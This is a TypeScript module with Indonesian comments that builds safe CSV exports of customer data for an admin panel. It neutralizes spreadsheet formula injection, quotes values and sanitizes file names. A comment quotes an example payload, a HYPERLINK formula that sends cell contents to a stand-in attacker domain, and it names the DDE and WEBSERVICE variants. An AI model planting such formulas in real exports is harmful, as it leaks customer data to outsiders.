// src/lib/csv.ts
//
// Penyusun CSV untuk ekspor daftar admin.
//
// KENAPA MODUL SENDIRI, BUKAN `rows.map(r => r.join(',')).join('\n')`
// ------------------------------------------------------------------
// Baris satu perintah itu adalah bentuk yang hampir selalu ditulis pertama, dan
// ia rusak pada data yang PALING sering ada di tabel ini:
//
//   - Alamat billboard memuat koma ("Jl. Sudirman No. 5, Jakarta") → satu kolom
//     pecah menjadi dua, dan SELURUH kolom di kanannya bergeser satu. Nominal
//     terbaca di kolom tanggal, dan spreadsheet tidak mengeluh.
//   - Catatan admin memuat baris baru → satu baris data menjadi dua baris CSV,
//     dan yang kedua tidak punya kolom pertama.
//   - Nama perusahaan memuat tanda kutip (PT "Maju" Jaya) → pembatas kolomnya
//     tertutup di tengah nilai.
//
// Yang ketiga tidak menghasilkan berkas rusak yang kelihatan rusak. Ia
// menghasilkan berkas yang TERBUKA dengan angka di kolom yang salah — dan itu
// dipakai untuk rekonsiliasi uang.
//
// INJEKSI RUMUS: ANCAMAN YANG BUKAN SOAL FORMAT
// ---------------------------------------------
// Nilai yang dimulai dengan `=`, `+`, `-`, `@`, tab, atau carriage return
// DIEKSEKUSI sebagai rumus oleh Excel, LibreOffice, dan Google Sheets saat
// berkasnya dibuka. Dan kolom yang diekspor di sini sebagian besar diisi oleh
// PEMBELI, bukan admin: `name`, `companyName`, `whatsapp`, `namaPemilik`,
// `alamat`.
//
// Jadi seorang pembeli bisa mendaftar dengan nama perusahaan:
//
//     =HYPERLINK("https://jahat.example/?d="&A1&B1&C1, "Klik untuk detail")
//
// dan setiap admin yang membuka ekspornya melihat tautan yang tampak wajar di
// tengah tabel internal. Satu klik mengirim isi tiga sel pertama — yaitu data
// pelanggan lain — ke server pihak ketiga. `=IMPORTXML(…)`, `=WEBSERVICE(…)`, dan
// `=cmd|'…'!A1` (DDE) adalah varian yang lebih buruk lagi.
//
// Ini bukan kerentanan aplikasi web: peramban tidak menjalankan apa pun. Yang
// menjalankannya adalah spreadsheet di laptop admin, jadi tidak satu pun header
// keamanan HTTP bisa menghalanginya. Yang bisa hanya penyusun CSV-nya.
//
// CARA MENAHANNYA, DAN KENAPA BUKAN DENGAN MEMBUANG KARAKTERNYA
// ------------------------------------------------------------
// Nilai berisiko diawali TAB (`\t`), lalu seluruhnya dikutip. Tab di dalam
// nilai berkutip terbaca spreadsheet sebagai bagian teks, dan keberadaannya
// membuat sel itu tidak lagi dianggap rumus — sementara isi aslinya tetap utuh
// dan tetap bisa dibaca manusia.
//
// Membuang atau mengganti karakter pembukanya adalah pilihan yang salah di sini:
// nomor telepon yang sah ditulis `+6281…`, dan nominal negatif ditulis `-50000`.
// Ekspor yang mengubah `+6281…` menjadi `6281…` atau `'+6281…` menghasilkan
// nomor yang tidak bisa dihubungi dan angka yang tidak bisa dijumlahkan — yaitu
// mengorbankan kebenaran data untuk keamanan, padahal keduanya bisa didapat.
//
// BOM UTF-8
// ---------
// Tiga bita `EF BB BF` di awal berkas. Tanpa itu, Excel di Windows membaca CSV
// sebagai encoding lokal (`windows-1252`), dan setiap nama yang memuat huruf
// beraksen atau simbol rupiah terbaca sebagai karakter acak. Admin yang
// menerimanya menyimpulkan datanya rusak di database.
//
// CRLF
// ----
// `\r\n` sebagai pemisah baris, sesuai RFC 4180. Excel versi lama di Windows
// menggabungkan seluruh baris menjadi satu saat hanya `\n` yang dipakai.

// Relatif, sesuai modul lain di `src/lib`. Bukan soal gaya: berkas ini
// di-`require` langsung oleh test tanpa penyelesai alias, dan `@/lib/tanggal` di
// sana adalah modul yang tidak ditemukan.
import { kunciTanggal } from './tanggal';

/**
 * BOM UTF-8, supaya Excel di Windows tidak salah menebak encoding.
 *
 * Ditulis `'\uFEFF'`, bukan karakternya langsung: karakter BOM TIDAK TERLIHAT di
 * editor mana pun, jadi salinan-tempel yang menghilangkannya menghasilkan diff
 * kosong dan bug yang hanya muncul di laptop Windows.
 */
export const BOM_UTF8 = '\uFEFF';

/**
 * Karakter pembuka yang membuat spreadsheet memperlakukan sel sebagai rumus.
 *
 * `\t` dan `\r` ikut: keduanya bisa menggeser nilai ke sel berikutnya pada
 * beberapa pembaca, sehingga `=…` yang didahului tab tetap sampai ke parser
 * rumus.
 */
const PEMBUKA_RUMUS = ['=', '+', '-', '@', '\t', '\r'];

/**
 * Apakah `nilai` akan dieksekusi sebagai rumus saat berkasnya dibuka.
 *
 * Diekspor supaya bisa diuji langsung: keputusan "sel ini berbahaya" adalah
 * satu-satunya keputusan keamanan di modul ini, dan ia harus bisa diperiksa
 * tanpa merangkai seluruh berkas lebih dulu.
 */
export function berisikoRumus(nilai: string): boolean {
  return nilai.length > 0 && PEMBUKA_RUMUS.includes(nilai[0]);
}

/**
 * Satu sel CSV: dinetralkan bila berisiko, lalu dikutip bila perlu.
 *
 * `null`/`undefined` menjadi teks kosong, BUKAN `"null"` — kolom kosong di
 * spreadsheet berarti "tidak ada isinya", sedangkan tulisan `null` di tengah
 * kolom alamat terbaca sebagai data.
 */
export function sel(nilai: unknown): string {
  if (nilai === null || nilai === undefined) return '';

  const teks = String(nilai);

  // Awalan tab: sel tetap terbaca manusia, tapi tidak lagi dianggap rumus.
  // Nilai yang dinetralkan SELALU dikutip — tab tanpa kutip adalah pemisah
  // kolom di sebagian pembaca.
  if (berisikoRumus(teks)) {
    return `"\t${teks.replace(/"/g, '""')}"`;
  }

  // Kutip hanya bila perlu. Berkas yang mengutip setiap sel sah, tapi jauh
  // lebih sulit dibaca saat seseorang membuka CSV-nya dengan editor teks untuk
  // mencari satu baris.
  if (teks.includes(',') || teks.includes('"') || teks.includes('\n') || teks.includes('\r')) {
    return `"${teks.replace(/"/g, '""')}"`;
  }

  return teks;
}

/**
 * Rangkai `baris` menjadi isi berkas CSV, lengkap dengan BOM dan CRLF.
 *
 * Baris pertama diperlakukan sama seperti sisanya — judul kolom pun bisa memuat
 * koma, dan tidak ada alasan menuliskannya lewat jalur yang berbeda.
 */
export function keCsv(baris: readonly (readonly unknown[])[]): string {
  return BOM_UTF8 + baris.map((b) => b.map(sel).join(',')).join('\r\n') + '\r\n';
}

/**
 * Nama berkas unduhan: `{awalan}-{YYYY-MM-DD}.csv`.
 *
 * Tanggalnya WAJIB ada di nama. Admin mengekspor daftar yang sama berulang kali
 * untuk membandingkan dua titik waktu, dan tiga berkas bernama `users.csv`,
 * `users (1).csv`, `users (2).csv` di folder Unduhan tidak bisa dibedakan lagi
 * setelah lima menit.
 *
 * Nama dibatasi huruf/angka/tanda hubung. `awalan` di modul ini selalu konstanta
 * dari kode, tapi pembatasannya tetap ditulis: nama berkas masuk ke header
 * `Content-Disposition`, dan nilai yang memuat baris baru di sana adalah injeksi
 * header. Menahannya di tempat namanya dibuat lebih murah daripada memercayai
 * setiap pemanggil yang akan datang.
 *
 * Tanggalnya lewat `kunciTanggal`, BUKAN `toISOString().slice(0, 10)`. Yang kedua
 * memotong di UTC: ekspor yang diambil 1 Oktober pukul 06.00 WIB akan bernama
 * `pengguna-2026-09-30.csv`. Karena satu-satunya alasan tanggal ini ada adalah
 * membandingkan dua titik waktu, nama yang menyebut hari sebelumnya justru
 * merusak keperluan yang membuatnya ditulis — dan paling sering tepat di batas
 * bulan, tempat angkanya dijumlahkan.
 */
export function namaBerkasCsv(awalan: string, sekarang: Date = new Date()): string {
  const bersih = awalan.replace(/[^a-zA-Z0-9-]/g, '') || 'ekspor';
  return `${bersih}-${kunciTanggal(sekarang)}.csv`;
}

/**
 * Header respons unduhan CSV.
 *
 * `Cache-Control: no-store` bukan bawaan dan bukan formalitas: isi berkas ini
 * adalah data pelanggan, dan proxy bersama atau cache peramban yang menyimpannya
 * membuat ekspor satu admin bisa disajikan kepada orang berikutnya yang membuka
 * URL yang sama.
 *
 * `text/csv; charset=utf-8` eksplisit walau sudah ada BOM — keduanya menjawab
 * pembaca yang berbeda, dan yang mengabaikan header belum tentu mengabaikan BOM.
 */
export function headerCsv(namaBerkas: string): HeadersInit {
  return {
    'Content-Type': 'text/csv; charset=utf-8',
    'Content-Disposition': `attachment; filename="${namaBerkas}"`,
    'Cache-Control': 'no-store',
  };
}
